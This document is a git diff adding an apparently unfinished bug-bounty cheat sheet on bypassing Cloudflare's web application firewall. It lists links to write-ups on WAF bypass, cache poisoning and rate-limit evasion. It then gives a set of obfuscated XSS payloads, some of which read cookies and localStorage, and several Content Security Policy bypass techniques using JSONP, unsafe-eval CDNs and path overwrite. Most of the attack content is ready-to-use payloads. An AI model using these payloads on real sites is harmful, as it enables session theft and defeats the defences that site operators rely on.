@@ -1,0 +1,74 @@
+Hello there,
+Its still undergoing updates. 
+
+Cloudflare 
+
+#Check Endpoints 
+	Check from Documentaion : https://github.com/cloudflare/cloudflare-docs
+
+#Check for misconfigurations : 
+
+
+#Must check links to visit 
+1. https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9
+2. https://medium.com/@the_harvester/bypassed-cloudflares-web-application-firewall-waf-44da57f3a1d3
+3. https://ltsirkov.medium.com/cross-site-scripting-via-web-cache-poisoning-and-waf-bypass-6cb3412d9e11
+4. https://codewithvamp.medium.com/bypassing-cloudflare-waf-with-host-address-manipulation-dd3508cce2f8
+5. https://infosecwriteups.com/how-i-was-able-to-bypass-cloudflare-for-xss-e94cd827a5d6
+6. https://medium.com/@mdnafeed3/bypassing-cloudflare-error-1015-you-are-being-rate-limited-f25f4e8f7bb2
+7. https://royzsec.medium.com/cloudflare-bypass-leads-to-rxss-reflected-cross-site-scripting-in-microsoft-a76404669ee9
+8. https://infosecwriteups.com/crlf-injection-xxx-how-was-it-possible-for-me-to-earn-a-bounty-with-the-cloudflare-waf-f581506f97f5
+9. https://systemweakness.com/how-i-bypassed-cloudflare-waf-to-get-my-first-bug-f02dab3a2d10
+10. https://systemweakness.com/automate-and-finds-the-ip-address-of-a-website-behind-cloudflare-45db99510b4b
+
+
+#Some payloads 
+
+<svg%0Aonauxclick=0;[1].some(confirm)//
+
+<svg onload=alert%26%230000000040"")>
+
+<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>
+<svg onx=() onload=(confirm)(1)>
+
+<svg onx=() onload=(confirm)(document.cookie)>
+
+<svg onx=() onload=(confirm)(JSON.stringify(localStorage))>
+
+Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
+
+"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+
+Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
+
+"><onx=[] onmouseover=prompt(1)>
+
+%2sscript%2ualert()%2s/script%2u -xss popup
+
+<svg onload=alert%26%230000000040"1")>
+
+"Onx=() onMouSeoVer=prompt(1)>"Onx=[] onMouSeoVer=prompt(1)>"/*/Onx=""//onfocus=prompt(1)>"//Onx=""/*/%01onfocus=prompt(1)>"%01onClick=prompt(1)>"%2501onclick=prompt(1)>"onClick="(prompt)(1)"Onclick="(prompt(1))"OnCliCk="(prompt`1`)"Onclick="([1].map(confirm))
+
+For more EDR and WAF 
+
+https://youtube.com/@LinuxbyVikku
+
+
+1. Third Party Endpoints + ('unsafe-eval')
+Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval'; 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
+
+2. Third Party Endpoints + JSONP
+Content-Security-Policy: script-src 'self' https://google.com https://youtube.com; object-src 'none';
+"><script src="https://google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+
+3. Third Party Abuses
+Content-Security-Policy​: default-src 'self’ http://facebook.com;​
+Content-Security-Policy​: connect-src http://facebook.com;​
+
+4. Bypass via RPO (Relative Path Overwrite)
+For example, if CSP allows the path https://example.com/scripts/react/, it can be bypassed as follows:
+<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
+
+
+
